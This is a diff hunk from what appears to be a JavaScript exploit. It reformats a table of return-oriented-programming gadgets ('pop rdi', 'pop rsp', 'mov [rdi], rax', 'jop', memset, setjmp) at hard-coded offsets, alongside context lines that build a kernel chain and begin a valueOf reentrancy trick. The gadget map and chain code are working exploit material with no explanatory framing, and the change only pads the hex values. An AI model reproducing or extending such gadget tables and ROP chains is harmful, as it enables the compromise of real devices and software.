@@ -71,34 +71,35 @@ var gadget = function(o)
       kchain.push(savectx.add32(0x50));
       kchain.push(window.gadgets["mov [rdi], rax"]);
       */
-          gadgets = {    
-  "ret":                    gadget(0x3C),
-  "jmp rax":                gadget(0x82),
-  "ep":                     gadget(0xAD),
-  "pop rbp":                gadget(0xB6),
-  "mov [rdi], rax":         gadget(0x3FBA),
-  "pop r8":                 gadget(0xCC42),
-  "pop rax":                gadget(0xCC43),
-  "mov rax, rdi":           gadget(0xE84E),
-  "mov rax, [rax]":         gadget(0x130A3),
-  "mov rdi, rax; jmp rcx":  gadget(0x3447A), 
-  "pop rsi":                gadget(0x7B1EE),
-  "pop rdi":                gadget(0x7B23D),
-  "add rsi, rcx; jmp rsi":  gadget(0x1FA5D4),
-  "pop rcx":                gadget(0x271DE3),
-  "pop rsp":                gadget(0x27A450),
-  "mov [rdi], rsi":         gadget(0x39CF70),
-  "mov [rax], rsi":         gadget(0x2565a7),
-  "add rsi, rax; jmp rsi":  gadget(0x2e001),
-  "pop rdx":                gadget(0xdedc2),
-  "pop r9":                 gadget(0xbb30cf),
-  "add rax, rcx":           gadget(0x15172),
-  "jop":                    gadget(0xc37d0),
-  "infloop":                gadget (0x12C4009),
+          gadgets = {  
+  "ret":                    gadget(0x0000003C),
+  "jmp rax":                gadget(0x00000082),
+  "ep":                     gadget(0x000000AD),
+  "pop rbp":                gadget(0x000000B6),
+  "mov [rdi], rax":         gadget(0x00003FBA),
+  "pop r8":                 gadget(0x0000CC42),
+  "pop rax":                gadget(0x0000CC43),
+  "mov rax, rdi":           gadget(0x0000E84E),
+  "mov rax, [rax]":         gadget(0x000130A3),
+  "mov rdi, rax; jmp rcx":  gadget(0x0003447A),
+  "pop rsi":                gadget(0x0007B1EE),
+  "pop rdi":                gadget(0x0007B23D),
+  "add rsi, rcx; jmp rsi":  gadget(0x001FA5D4),
+  "pop rcx":                gadget(0x00271DE3),
+  "pop rsp":                gadget(0x0027A450),
+  "mov [rdi], rsi":         gadget(0x0039CF70),
+  "mov [rax], rsi":         gadget(0x002565a7),
+  "add rsi, rax; jmp rsi":  gadget(0x0002e001),
+  "pop rdx":                gadget(0x000dedc2),
+  "pop r9":                 gadget(0x00bb30cf),
+  "add rax, rcx":           gadget(0x00015172),
+  "jop":                    gadget(0x000c37d0),
+  "infloop":                gadget(0x012C4009),
 
-        "memset": gadget(0x228),
-        "setjmp": gadget(0x14f8)
-    };  
+  "memset":                 gadget(0x00000228),
+  "setjmp":                 gadget(0x000014f8)
+};
+  
    
 ;var reenter_help = { length:
     { valueOf: function(){
